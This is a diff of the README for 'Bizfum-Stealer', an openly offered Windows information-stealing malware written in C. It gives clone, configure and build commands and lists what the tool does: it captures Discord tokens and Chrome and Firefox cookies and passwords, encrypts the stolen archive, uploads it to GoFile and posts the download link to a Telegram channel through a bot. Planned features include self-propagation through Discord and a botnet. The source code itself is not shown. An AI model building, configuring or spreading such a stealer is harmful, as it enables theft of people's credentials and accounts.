@@ -20,20 +20,35 @@
 - [Known Issues](#-known-issues)
 
 ## ⚙️ Installation
-The installation process is straightforward. Clone the repository and choose the desired version, as indicated in the repository structure. For instance, to install the version with debug information:
+The installation process is straightforward. Clone the repository, run the config.py and then build.(bat/sh):
 
 **Bash**
+Configure:
 ```bash
-git clone https://github.com/UnknownWebPT/Bizfum-Stealer.git && cd Bizfum-Stealer/debug-version && chmod +x build.sh && ./build.sh
+git clone https://github.com/UnknownWebPT/Bizfum-Stealer.git && cd Bizfum-Stealer && pip install -r requirements.txt && python config.py
+```
+Build:
+```bash
+chmod +x build.sh && ./build.sh
 ```
 
 **Powershell**
+Configure:
 ```powershell
-git clone https://github.com/UnknownWebPT/Bizfum-Stealer.git; cd Bizfum-Stealer; Start-Process "build.bat"
+git clone https://github.com/UnknownWebPT/Bizfum-Stealer.git; cd Bizfum-Stealer; pip install -r requirements.txt && python config.py
+```
+Build:
+```powershell
+.\build.bat
 ```
 **Batch**
+Configure:
 ```cmd
-git clone https://github.com/UnknownWebPT/Bizfum-Stealer.git && cd Bizfum-Stealer && .\build.bat
+git clone https://github.com/UnknownWebPT/Bizfum-Stealer.git && cd Bizfum-Stealer && pip install -r requirements.txt && python config.py
+```
+Build:
+```cmd
+build
 ```
 
 ## ❓ Purpose
@@ -50,13 +65,18 @@ My personal interest in this project stems from the lack of open-source C-based 
 - Captures Discord tokens.
 - Stealing of Chrome and Firefox cookies + passwords.
 - Zipping of stolen data -> AES Encryption of ZIP file -> RSA Encryption of AES Encryption Key.
+- Uploading of encrypted data to GoFile
+- Send a download link to a Telegram channel through an bot.
+- Possibility of generating a new fresh RSA (CNG) key, choose own XOR key, and unique encoding of Telegram token. This is all automated by `config.py`.
 
 ## 🛠️ Coming Features
 - Other browser theft.
 - Self-propagation through applications such as Discord.
-- Uses `winhttp.dll` to upload stolen data to gofile.io via their API.
 - Extraction of game tokens or credentials.
-- Potential development of a Telegram-based botnet without requiring constant connectivity or request spamming.
+- Potential development of a botnet.
+- Better "infected" message to Telegram.
+- Machine information theft (IP, Computer Name, AD info, etc).
+- More customization features to `config.py`.
 
 ## 🧬 DLLs the Stealer Takes Advantage of
 - C:\Program Files\Mozilla Firefox\nss3.dll ( If Firefox is installed )
@@ -68,9 +88,9 @@ My personal interest in this project stems from the lack of open-source C-based 
 - C:\Windows\System32\gdi32.dll
 
 ## 🗂️ Repository Structure
-The repository includes both DLL and EXE versions of the malware. This allows for use of for example a *Reflective DLL Loader*. Both versions have been tested on Windows 10 and Windows 11.
+The repository has at the moment only a verbose version of the stealer, meaning there are quite a lot of comments and printing. Later on `Bizfum-Stealer/normal/` folder will include the same code as in `Bizfum-Stealer/verbose/`, but without any comments or printing.
 
-Additionally, a version with debug information is available that does not connect anywhere. The version without debug information will send data and function correctly if set up properly.
+Additionally, in the future you could run the `config.py` file to choose if you want to config the file as an DLL. The `config.py` file would then go ahead and edit the build.(bat/sh) file to specifically compile the files as an DLL.
 
 ## 📜 Disclaimer
 
@@ -124,7 +144,9 @@ V0.1 - 19th of September - Project started.
 
 V0.2 - 26th of September - Added Firefox and Chrome (cookie / password) (decryption / stealing).
 
-V0.3 - 3rd of October    - Added Zipping of stolen data && AES Encryption of ZIP file && RSA Encryption of AES Key && Base64 Encoding of RSA encrypted AES Key
+V0.3 - 3rd of October    - Added Zipping of stolen data && AES Encryption of ZIP file && RSA Encryption of AES Key && Base64 Encoding of RSA encrypted AES Key.
+
+V0.4 - 22nd of October   - Added `config.py` file to help in customizing the source code. Custom encoding/encryption algorithm to Telegram token. Uploading of data to GoFile. Sending of the download link to a Telegram channel, through a bot.
 
 ## 🐞 Known Issues
 - SQLite function calls act in a unexpected way for 64-bit os.
